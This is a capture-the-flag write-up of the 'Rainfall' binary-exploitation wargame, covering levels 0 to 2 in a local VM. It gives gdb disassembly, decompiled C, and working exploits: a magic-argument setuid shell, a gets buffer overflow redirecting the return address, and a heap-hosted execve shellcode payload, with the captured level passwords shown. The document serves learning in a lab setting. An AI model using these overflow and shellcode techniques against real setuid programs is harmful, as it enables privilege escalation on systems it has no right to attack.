# Rainfall

## level0

After port forwarding the port 4242 to 24242 on the host, we login to the VM and get greeted by this screen:

```
ssh -p 24242 level0@localhost
          _____       _       ______    _ _ 
         |  __ \     (_)     |  ____|  | | |
         | |__) |__ _ _ _ __ | |__ __ _| | |
         |  _  /  _` | | '_ \|  __/ _` | | |
         | | \ \ (_| | | | | | | | (_| | | |
         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.0.2.15:4242
level0@localhost's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/level0/level
```

For the most part, it means that exploitation will be as easy as possible:
- addresses will not be randomized
- buffer overflows will not be protected
- no section will be marked as non-executable, allowing us to create shellcodes

```console
level0@RainFall:~$ ls -al
total 737
dr-xr-x---+ 1 level0 level0     60 Mar  6  2016 .
dr-x--x--x  1 root   root      340 Sep 23  2015 ..
-rw-r--r--  1 level0 level0    220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level0 level0   3530 Sep 23  2015 .bashrc
-rwsr-x---+ 1 level1 users  747441 Mar  6  2016 level0
-rw-r--r--  1 level0 level0    675 Apr  3  2012 .profile
```

There is a single executable with the setuid bit on, meaning that the executable will be run with the permissions of the next level. This is the pattern for all levels. We will hop from user `level0` to `level9`, then `bonus0` to `bonus3`. The challenge will be completed when we reach the `end` user.

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048ec0 <+0>:     push   ebp
   0x08048ec1 <+1>:     mov    ebp,esp
   0x08048ec3 <+3>:     and    esp,0xfffffff0
   0x08048ec6 <+6>:     sub    esp,0x20
   0x08048ec9 <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048ecc <+12>:    add    eax,0x4
   0x08048ecf <+15>:    mov    eax,DWORD PTR [eax]
   0x08048ed1 <+17>:    mov    DWORD PTR [esp],eax
   0x08048ed4 <+20>:    call   0x8049710 <atoi>
   0x08048ed9 <+25>:    cmp    eax,0x1a7
   0x08048ede <+30>:    jne    0x8048f58 <main+152>
   0x08048ee0 <+32>:    mov    DWORD PTR [esp],0x80c5348
   0x08048ee7 <+39>:    call   0x8050bf0 <strdup>
   0x08048eec <+44>:    mov    DWORD PTR [esp+0x10],eax
   0x08048ef0 <+48>:    mov    DWORD PTR [esp+0x14],0x0
   0x08048ef8 <+56>:    call   0x8054680 <getegid>
   0x08048efd <+61>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048f01 <+65>:    call   0x8054670 <geteuid>
   0x08048f06 <+70>:    mov    DWORD PTR [esp+0x18],eax
   0x08048f0a <+74>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048f0e <+78>:    mov    DWORD PTR [esp+0x8],eax
   0x08048f12 <+82>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048f16 <+86>:    mov    DWORD PTR [esp+0x4],eax
   0x08048f1a <+90>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048f1e <+94>:    mov    DWORD PTR [esp],eax
   0x08048f21 <+97>:    call   0x8054700 <setresgid>
   0x08048f26 <+102>:   mov    eax,DWORD PTR [esp+0x18]
   0x08048f2a <+106>:   mov    DWORD PTR [esp+0x8],eax
   0x08048f2e <+110>:   mov    eax,DWORD PTR [esp+0x18]
   0x08048f32 <+114>:   mov    DWORD PTR [esp+0x4],eax
   0x08048f36 <+118>:   mov    eax,DWORD PTR [esp+0x18]
   0x08048f3a <+122>:   mov    DWORD PTR [esp],eax
   0x08048f3d <+125>:   call   0x8054690 <setresuid>
   0x08048f42 <+130>:   lea    eax,[esp+0x10]
   0x08048f46 <+134>:   mov    DWORD PTR [esp+0x4],eax
   0x08048f4a <+138>:   mov    DWORD PTR [esp],0x80c5348
   0x08048f51 <+145>:   call   0x8054640 <execv>
   0x08048f56 <+150>:   jmp    0x8048f80 <main+192>
   0x08048f58 <+152>:   mov    eax,ds:0x80ee170
   0x08048f5d <+157>:   mov    edx,eax
   0x08048f5f <+159>:   mov    eax,0x80c5350
   0x08048f64 <+164>:   mov    DWORD PTR [esp+0xc],edx
   0x08048f68 <+168>:   mov    DWORD PTR [esp+0x8],0x5
   0x08048f70 <+176>:   mov    DWORD PTR [esp+0x4],0x1
   0x08048f78 <+184>:   mov    DWORD PTR [esp],eax
   0x08048f7b <+187>:   call   0x804a230 <fwrite>
   0x08048f80 <+192>:   mov    eax,0x0
   0x08048f85 <+197>:   leave  
   0x08048f86 <+198>:   ret    
End of assembler dump.
(gdb) x/s 0x80c5350
0x80c5350:       "No !\n"
(gdb) x/s 0x80c5348
0x80c5348:       "/bin/sh"
```

Decompiled, this looks like this:

```c
int main(int argc, char** argv) {
    if (atoi(argv[1]) == 423) {
        char* exec_argv[2] = {strdup("/bin/sh"), NULL};

        gid_t egid = getegid();
        uid_t euid = geteuid();

        setresgid(egid, egid, egid);
        setresuid(euid, euid, euid);

        execv("/bin/sh", exec_argv);
    } else {
        fwrite("No !\n", 1, 5, stdout);
    }

    return 0;
}
```

The program checks if `argv[1]` has the correct value (0x1a7 = 423), and executes a shell with elevated privileges.

```console
level0@RainFall:~$ ./level0 777
No !
level0@RainFall:~$ ./level0 423
$ cat /home/user/level1/.pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```


## level1

This is a very short program that seems to only call `gets`.

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.
```

The man page of `gets` says the following:

```
BUGS
       Never  use  gets().   Because  it is impossible to tell without knowing the
       data in advance how many characters gets() will read,  and  because  gets()
       will  continue  to  store  characters past the end of the buffer, it is ex‐
       tremely dangerous to use.  It has been used  to  break  computer  security.
       Use fgets() instead.
```

There is another function called `run` that opens a shell with the permissions of the next level.

```
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

Decompiled with Ghidra, the full program looks like this:

```c
void run() {
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main() {
    char buf[64];
    gets(buf);
}
```

Our goal is to overwrite the return address of `main` so that it jumps to `run` insteads of exiting the program.

The layout of the stack before calling `gets` is:
- return address (4 bytes)
- base pointer (4 bytes)
- unused bytes due to alignment (8 bytes)
- buffer (64 bytes)

With a Python one-liner, we provide 76 garbage values, then the address of `run` in little endian. We call `cat` to keep stdin of `level1`, allowing us to use the shell.

```
level1@RainFall:~$ (python -c 'print("w" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```


## level2

We are once again face to face with a `gets` vulnerability.

```c
void p() {
    char buf[64];
    unsigned int ret_addr;

    fflush(stdout);
    gets(buf);

    ret_addr = (unsigned int)__builtin_return_address(0);
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", (const void*)ret_addr);
        _exit(1);
    }

    puts(buf);
    strdup(buf);
}

int main() { p(); }
```

The previous level provided us with a helper function running a shell, but we have no such luck this time.

We can write custom machine code to a buffer then jump to this buffer to execute it. This code is usually just a call to `execve("/bin/sh", 0, 0)`. Thus the name: **shellcode**.

A shellcode exploit has this structure:
- actual shellcode
- padding to align the address we'll write to the saved return address
- address of the start of the shellcode

This level makes it a bit harder by checking if the address is in the range `0xb0000000` -> `0xffffffff`, which contains the stack. Luckily the buffer is duplicated on the heap with `strdup` right after.

```console
(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret    
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
[...]
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave  
   0x0804853e <+106>:   ret    
End of assembler dump.
(gdb) b *0x0804853d
Breakpoint 1 at 0x804853d
(gdb) run
Starting program: /home/user/level2/level2 
lol
lol

Breakpoint 1, 0x0804853d in p ()
(gdb) info reg eax
eax            0x804a008        134520840
```

The address of our shellcode will be 0x804a008, a value on the heap, which avoids the stack check.

```
[ebp-0x4c] ... [ebp-0x0d] → buf[64]
[ebp-0x0c]                → ret_addr (4 bytes)
[ebp-0x08] ... [ebp-0x04] → ??? (8 bytes)
[ebp+0x00]                → saved EBP (4 bytes)
[ebp+0x04]                → real return address
```

The script [level2.py](./resources/level2.py) prints the full exploit.

```console
level2@RainFall:~$ (python /tmp/level2.py ; cat) | ./level2
1�P
   h//shh/bin��1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
level2@RainFall:~$ (python /tmp/level2.py ; cat) | ./level2 
1�P
   h//shh/bin��1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

